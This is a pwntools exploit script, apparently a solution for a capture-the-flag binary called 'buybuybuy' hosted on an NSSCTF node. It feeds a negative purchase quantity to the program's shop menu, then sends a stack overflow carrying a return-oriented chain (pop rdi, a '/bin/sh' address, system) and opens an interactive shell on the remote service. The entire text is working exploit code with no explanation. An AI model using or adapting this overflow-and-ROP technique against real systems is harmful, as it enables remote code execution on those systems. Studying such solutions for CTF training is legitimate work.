from pwn import *

gift = 0x401544
ret = 0x40101a
sh= 0x04021f4
system = 0x401553
rdi = 0x4015c3
#io = process("./buybuybuy")
io = remote("node4.anna.nssctf.cn", 26548)
io.recvuntil(b"your choice:")
io.sendline(b"1")
io.recvuntil(b"what do you want?")
io.sendline(b"1")
io.recvuntil(b"How many?")
io.sendline(b"-1000")

io.recvuntil(b"your choice:")
io.sendline(b"2")
io.recvuntil(b"what do you want?")
io.sendline(b"1")
io.recvuntil(b"How many?")
io.sendline(b"1")

io.recvuntil(b"input:")
io.sendline(b"a" * (0xa + 0x8)+ p64(rdi) + p64(sh) + p64(system)) 


io.interactive()
